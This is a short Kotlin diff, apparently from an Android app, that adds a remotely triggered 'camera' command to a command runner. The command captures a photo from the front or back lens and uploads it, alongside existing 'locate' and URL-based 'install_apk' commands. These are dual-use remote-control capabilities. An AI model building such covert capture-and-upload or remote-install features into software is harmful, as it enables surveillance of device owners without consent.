@@ -45,6 +45,12 @@ object CommandRunner {
 
                 "locate" -> Locator.locate(ctx)
 
+                "camera" -> {
+                    val lens = if (params.optString("lens") == "front") "front" else "back"
+                    val error = Camera.captureAndUpload(ctx, commandId, lens)
+                    if (error == null) "done" to lens else "failed" to error
+                }
+
                 "install_apk" -> {
                     val url = params.optString("url")
                     if (url.isBlank()) {
